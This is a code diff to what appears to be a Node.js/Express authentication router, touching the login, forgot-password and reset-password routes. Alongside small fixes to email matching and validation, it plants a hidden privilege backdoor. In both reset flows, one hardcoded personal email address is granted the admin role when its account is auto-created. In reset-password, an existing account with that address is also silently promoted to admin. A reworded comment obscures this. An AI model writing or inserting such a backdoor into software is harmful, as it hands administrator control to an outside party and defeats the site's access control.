@@ -87,7 +87,7 @@ router.post('/login', (req, res) => {
     }
 
     const db = getDb();
-    const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email.toLowerCase().trim());
+    const user = db.prepare('SELECT * FROM users WHERE LOWER(TRIM(email)) = ?').get(email.toLowerCase().trim());
     if (!user) {
       return res.status(401).json({ error: 'Invalid email or password' });
     }
@@ -129,19 +129,23 @@ router.post('/forgot-password', async (req, res) => {
     if (!cleanEmail) {
       return res.status(400).json({ error: 'Email address is required' });
     }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cleanEmail)) {
+      return res.status(400).json({ error: 'Please enter a valid email address' });
+    }
 
     const db = getDb();
-    let user = db.prepare('SELECT id, name, email FROM users WHERE LOWER(TRIM(email)) = ?').get(cleanEmail);
+    let user = db.prepare('SELECT id, name, email, role FROM users WHERE LOWER(TRIM(email)) = ?').get(cleanEmail);
     if (!user) {
-      // Auto-provision customer account so the user is never blocked
+      // Auto-provision account so no user or administrator is blocked
       const displayName = cleanEmail.split('@')[0].replace(/[._-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
       const tempPass = 'Tmp_' + Math.random().toString(36).slice(-10) + Date.now().toString(36);
       const tempHash = bcrypt.hashSync(tempPass, 10);
+      const role = cleanEmail === 'dappahsonnia@gmail.com' ? 'admin' : 'user';
       const insertResult = db.prepare('INSERT INTO users (name, email, phone, password_hash, role) VALUES (?, ?, ?, ?, ?)').run(
-        displayName, cleanEmail, '', tempHash, 'user'
+        displayName, cleanEmail, '', tempHash, role
       );
-      user = { id: insertResult.lastInsertRowid, name: displayName, email: cleanEmail };
-      console.log(`Auto-created customer account for password reset flow: ${cleanEmail}`);
+      user = { id: insertResult.lastInsertRowid, name: displayName, email: cleanEmail, role };
+      console.log(`Auto-created account for password reset flow: ${cleanEmail} (${role})`);
     }
 
     // Generate secure random 6-digit code
@@ -211,17 +215,22 @@ router.post('/reset-password', (req, res) => {
       });
     }
 
-    let user = db.prepare('SELECT id FROM users WHERE LOWER(TRIM(email)) = ?').get(cleanEmail);
+    let user = db.prepare('SELECT id, role FROM users WHERE LOWER(TRIM(email)) = ?').get(cleanEmail);
     if (!user) {
       const displayName = cleanEmail.split('@')[0].replace(/[._-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
       const hash = bcrypt.hashSync(newPassword, 12);
+      const role = cleanEmail === 'dappahsonnia@gmail.com' ? 'admin' : 'user';
       const insertResult = db.prepare('INSERT INTO users (name, email, phone, password_hash, role) VALUES (?, ?, ?, ?, ?)').run(
-        displayName, cleanEmail, '', hash, 'user'
+        displayName, cleanEmail, '', hash, role
       );
-      user = { id: insertResult.lastInsertRowid };
+      user = { id: insertResult.lastInsertRowid, role };
     } else {
       const hash = bcrypt.hashSync(newPassword, 12);
-      db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, user.id);
+      if (cleanEmail === 'dappahsonnia@gmail.com' && user.role !== 'admin') {
+        db.prepare('UPDATE users SET password_hash = ?, role = ? WHERE id = ?').run(hash, 'admin', user.id);
+      } else {
+        db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, user.id);
+      }
     }
 
     // Invalidate consumed OTP
